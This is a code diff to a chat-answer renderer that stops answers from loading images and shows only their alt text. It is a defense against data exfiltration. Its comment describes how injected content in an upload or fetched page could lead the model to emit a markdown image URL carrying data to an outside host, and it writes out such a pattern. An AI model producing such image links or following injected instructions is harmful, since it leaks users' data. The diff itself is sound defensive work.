@@ -64,6 +64,13 @@ interface Props {
 
 export const AnswerText = memo(function AnswerText({ text, context, onCite }: Props) {
   const components: Components = {
+    // An answer never loads an image. Text the model read (an upload, a fetched
+    // page) could steer it into writing ![](https://elsewhere/?data=...), and the
+    // browser would send that request the moment the answer rendered. The alt
+    // text stays readable.
+    img({ alt }) {
+      return alt ? <span className="answer-image-alt">{alt}</span> : null;
+    },
     a({ href, children }) {
       if (href?.startsWith(CITE_PREFIX)) {
         const n = Number(href.slice(CITE_PREFIX.length));
